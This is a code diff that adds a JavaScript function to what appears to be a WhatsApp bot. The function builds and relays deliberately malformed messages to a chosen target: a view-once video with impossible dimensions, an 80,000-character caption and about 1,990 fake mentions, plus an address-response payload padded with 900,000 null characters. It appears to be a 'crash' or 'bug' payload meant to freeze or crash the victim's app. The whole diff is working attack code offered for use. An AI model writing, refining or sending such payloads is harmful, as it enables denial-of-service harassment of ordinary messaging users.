@@ -80,7 +80,65 @@ async function delayJembut(sock, target) {
   }
 }
 
-async function blankButtonX(sock, target) {
+async function AmpasCuih(sock, target) {
+  const cuih = "ꦾ".repeat(80000);
+  
+  const viewOnceMsg = generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        videoMessage: {
+          url: "https://files.catbox.moe/jdv0yt.mp4",
+          mimetype: "video/mp4",
+          fileSha256: "QxkYuxM0qMDgqUK5WCi91bKWGFDoHhNNkrRlfMNEjTo=",
+          fileLength: "999999999999",
+          height: 999999999,
+          width: 999999999,
+          mediaKey: "prx9yPJPZEJ5aVgJnrpnHYCe8UzNZX6/QFESh0FTq+w=",
+          fileEncSha256: "zJgg0nMJT1uBohdzwDXkOxaRlQnhJZb+qzLF1lbLucc=",
+          directPath: "/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1762488513",
+          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIAMBIgACEQEDEQH/xAAtAAACAwEAAAAAAAAAAAAAAAAABAIDBQEBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAAQgzOsuOtNHI6YZhpxRWpeubdXLKhm1ckeEqlp6CS4B//xAAkEAACAwABAwQDAQAAAAAAAAABAgADEQQSFCETMUFREDJCUv/aAAgBAQABPwDtVC4riLw6zvU8bitpzI1Tge0FQW1ARgjUKOSVzwZZxwjossqSpQp8ndyXUNYQ31DxrS4eNxrGsDmcjju7KyjzD+G8TcG7H5PSPE7m2dwzIwM63/1P3c/QlrqkqAdfqehn9CLfWPacy0m3QYrM1S4fM67x8iBg3zkZAf6muAMMc2fJgvOZk9YzuW9sh5BzMn//xAAXEQEBAQEAAAAAAAAAAAAAAAARAAEg/9oACAECAQE/ACJmLNOf/8QAGREBAQADAQAAAAAAAAAAAAAAAREAAhBC/9oACAEDAQE/ADaNg5cdVJZhqnpeJeV7/9k=",
+          caption: cuih,
+          contextInfo: {
+            stanzaId: "Thumbnail.id",
+            isForwarded: true,
+            forwardingScore: 999,
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
+            ]
+          }
+        }
+      }
+    }
+  }, {});
+  
+  const Payment_Info = generateWAMessageFromContent(target, {
+    interactiveResponseMessage: {
+      body: {
+        text: "Cuihhh Test aja",
+        format: "DEFAULT"
+      },
+      nativeFlowResponseMessage: {
+        name: "address_message",
+           paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
+        version: 3
+      }
+    }
+  }, {});
+  
+  await sock.relayMessage("status@broadcast", viewOnceMsg.message, {
+    messageId: viewOnceMsg.key.id,
+    statusJidList: [target]
+  });
+  
+  await sock.relayMessage("status@broadcast", Payment_Info.message, {
+    messageId: Payment_Info.key.id,
+    statusJidList: [target]
+  });
+}
+
+async function blankButton(sock, target) {
 await sock.sendMessage(
   target,
   {
